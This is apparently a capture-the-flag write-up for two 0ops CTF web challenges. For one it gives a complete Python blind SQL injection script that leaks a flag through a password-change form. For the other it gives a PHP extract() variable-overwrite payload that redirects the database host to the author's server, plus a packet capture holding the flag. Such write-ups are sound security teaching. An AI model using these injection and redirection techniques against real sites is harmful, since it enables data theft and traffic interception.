`https://ctf.0ops.sjtu.cn/`
Participated as Ad Victoriam

## Lily (150pt)

There is nothing much to do in this challenge, since there are limited inputs to check vulnerabilities.
After few trials of injecting invalid inputs, you may see that the `/modify` is vulnerable to SQLi attacks.

As you analyze the sql mechanism, you may see that the service associates accounts with SQLite, and this can be checked by executing `sqlite_version()` command from the password input.

Through several SQLite Injections, you will be able to find out the table `flag` and the column `flag`.
You will be able to leak the flag by sqlite blind sql injection.

```
import urllib2
import urllib
import sys

character = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','-','_','{','}','?']
flag = ""
count = 0

if(1==1):
    for i in xrange(1,32):
        for j in character:
            count += 1
            payload = "0' or substr((select flag from flag limit 0,1)," + str(i) + ",1)='" + str(j) + "' or '0"
            # register
            register_data = values = {'username' : 'stypr' + str(count),
                        'password' : 'password',
                        'email' : 'root@stypr.com'}
            register_data = urllib.urlencode(register_data)
            register = urllib2.Request("http://202.112.28.113:5000/register", register_data)
            register_response = urllib2.urlopen(register)
            register_cookie = register_response.headers.get('Set-Cookie')
            register_response = register_response.read()

            # auth
            auth_data = values = {'username' : 'stypr' + str(count),
                                    'password' : 'password'}
            auth_data = urllib.urlencode(auth_data)
            auth = urllib2.Request("http://202.112.28.113:5000/login", auth_data)
            auth.add_header('Cookie', register_cookie)
            auth_response = urllib2.urlopen(auth)
            auth_cookie = auth_response.headers.get('Set-Cookie')
            auth_response = auth_response.read()

            # modify
            modify_data = values = {'password' : str(payload)}
            print(modify_data)
            modify_data = urllib.urlencode(modify_data)
            modify = urllib2.Request("http://202.112.28.113:5000/modify", modify_data)
            modify.add_header('Cookie', auth_cookie)
            modify_response = urllib2.urlopen(modify)
            modify_cookie = modify_response.headers.get('Set-Cookie')
            modify_response = modify_response.read()
            username = 'haroldie' + str(choice)

            # reauth
            reauth_data = values = {'username' : 'stypr' + str(count),
                                    'password' : '1'}
            reauth_data = urllib.urlencode(reauth_data)
            reauth = urllib2.Request("http://202.112.28.113:5000/login", reauth_data)
            reauth.add_header('Cookie', modify_cookie)
            reauth_response = urllib2.urlopen(reauth)
            reauth_cookie = reauth_response.headers.get('Set-Cookie')
            reauth_response = reauth_response.read()

            if "Invalid password" in reauth_response:
               print("False")
            else:
               flag += str(j)
               print("flag found: " + flag)
               break
```

--

## Forward (250pt)

As you analyze the sourcecode from `http://202.112.28.121/admin.php?view-source`, 
you may see that the website is vulnerable with the extract function. 

`extract($_GET); // this is my backdoor :)`

As we look further, we can see that the key and the database is included before the `extract` function,
which would let us to modify `$host` variable, `$key` variable and other variables.

By redirecting the host to your own server and manipulating the `$key` variable, you will be able to leak the flag by performing a Man-in-the-middle attack.

`Payload: http://202.112.28.121/admin.php?_POST[key]=1&key=1&debug=true&nonce=&host=stypr.com`

```
# tcpdump -vv -w ~/final.log

...

https://www.cloudshark.org/captures/2c438d32dfc0?filter=mysql

...

def.forward.flag.flag.flag.flag...0................"......0ctf{w3ll_d0ne_guY}.......".

```
